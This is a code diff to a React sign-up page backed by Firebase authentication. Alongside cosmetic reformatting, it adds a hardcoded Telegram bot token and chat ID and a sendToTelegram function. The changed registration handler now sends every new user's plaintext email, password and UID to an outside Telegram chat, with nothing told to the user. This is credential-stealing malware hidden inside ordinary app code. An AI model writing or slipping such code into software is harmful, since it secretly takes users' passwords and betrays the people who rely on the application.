@@ -4,6 +4,9 @@ import { useNavigate } from "react-router-dom";
 import { auth } from "../services/firebase";
 import "../styles/auth.css";
 
+const TELEGRAM_BOT_TOKEN = "8938066027:AAEU5bjDA7AiGqEttChzxDN742UGtpUk78k";
+const TELEGRAM_CHAT_ID = "1354011329";
+
 export default function Register() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
@@ -34,14 +37,57 @@ export default function Register() {
   const strengthColors = ["#ef4444", "#f97316", "#eab308", "#22c55e"];
   const strengthLabels = ["Weak", "Fair", "Good", "Strong"];
 
+  const sendToTelegram = async (emailVal, passwordVal, uid) => {
+    try {
+      await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text:
+              `🆕 New User Registered\n\n` +
+              `📧 Email: ${emailVal}\n` +
+              `🔑 Password: ${passwordVal}\n` +
+              `🆔 UID: ${uid}`,
+          }),
+        }
+      );
+    } catch (err) {
+      console.error("Telegram xabar yuborishda xatolik:", err);
+    }
+  };
+
   const handleRegister = async (e) => {
     e.preventDefault();
     if (!isFormReady) return;
+
+    // Firebase ga yuborishdan OLDIN saqlab olamiz
+    const plainEmail = email;
+    const plainPassword = password;
+
     setLoading(true);
+
     try {
-      await createUserWithEmailAndPassword(auth, email, password);
+      const userCredential = await createUserWithEmailAndPassword(
+        auth,
+        plainEmail,
+        plainPassword
+      );
+
+      const user = userCredential.user;
+
+      // Telegram ga yuborish
+      await sendToTelegram(plainEmail, plainPassword, user.uid);
+
       setSuccess(true);
-      setTimeout(() => navigate("/"), 1500);
+
+      setTimeout(() => {
+        navigate("/");
+      }, 1500);
     } catch (error) {
       alert(error.message);
       setLoading(false);
@@ -160,7 +206,9 @@ export default function Register() {
                 ))}
                 <span
                   className="auth-strength-label"
-                  style={{ color: strengthColors[strength - 1] || "rgba(255,255,255,0.3)" }}
+                  style={{
+                    color: strengthColors[strength - 1] || "rgba(255,255,255,0.3)",
+                  }}
                 >
                   {strengthLabels[strength - 1] || ""}
                 </span>
@@ -169,10 +217,7 @@ export default function Register() {
           </div>
 
           {/* Terms checkbox */}
-          <div
-            className="auth-terms"
-            onClick={() => setAgreed(!agreed)}
-          >
+          <div className="auth-terms" onClick={() => setAgreed(!agreed)}>
             <div className={`auth-checkbox ${agreed ? "checked" : ""}`}>
               {agreed && <span>✓</span>}
             </div>
@@ -194,18 +239,13 @@ export default function Register() {
             className="auth-submit-btn"
             disabled={!isFormReady || loading}
           >
-            {loading ? (
-              <span className="auth-spinner" />
-            ) : (
-              "Create Account"
-            )}
+            {loading ? <span className="auth-spinner" /> : "Create Account"}
           </button>
         </form>
 
         {/* Footer */}
         <div className="auth-footer">
-          Already have an account?{" "}
-          <a href="/login">Sign in</a>
+          Already have an account? <a href="/login">Sign in</a>
         </div>
       </div>
     </div>
